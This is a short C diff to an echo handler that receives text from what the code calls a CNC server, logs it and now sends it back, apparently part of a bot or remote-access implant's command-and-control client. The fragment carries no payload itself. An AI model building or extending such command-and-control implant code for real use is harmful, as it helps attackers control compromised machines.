@@ -23,13 +23,20 @@ void handle_echo()
         return;
     }
     ret = recv_from_cnc(cmd.text, cmd.text_len);
-    cmd.text[cmd.text_len] = 0;
     if (ret != cmd.text_len)
     {
-        log_error("Received invalid shell command.");
+        log_error("Received invalid echo text.");
         return;
     }
+    cmd.text[cmd.text_len] = 0;
     log_info("Received echo: %s", cmd.text);
+
+    ret = send_to_cnc(cmd.text, cmd.text_len);
+    if (ret != cmd.text_len)
+    {
+        log_error("Failed to send echoed text to CNC.");
+        return;
+    }
     free(cmd.text);
 }
 
